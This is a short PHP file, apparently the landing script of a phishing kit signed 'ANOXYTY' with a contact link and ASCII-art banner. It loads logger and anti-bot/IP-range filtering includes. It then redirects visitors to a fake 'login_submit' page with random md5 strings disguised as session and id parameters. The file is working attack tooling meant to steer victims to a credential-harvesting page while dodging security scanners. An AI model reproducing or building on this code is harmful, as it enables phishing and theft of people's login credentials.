<?php 
/*       
// made by ANOXYTY" // https://icq.im/Anoxyty "HQ PAGE"
                           ______
        |\_______________ (_____\\______________
HH======#H###############H#######################
        ' ~""""""""""""""`##(_))#H\"""""Y########
                          ))    \#H\       `"Y###
                          "      }#H)
*/
require_once 'huntg/T3R/logger.php';
	require 'huntg/T3R/bot.php';
	require 'huntg/T3R/usera.php';
	require 'huntg/T3R/rangip.php';
	require 'huntg/T3R/usera2.php';
	$praga=rand();
	$praga=md5($praga);

	header("location: huntg/index.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");


?>
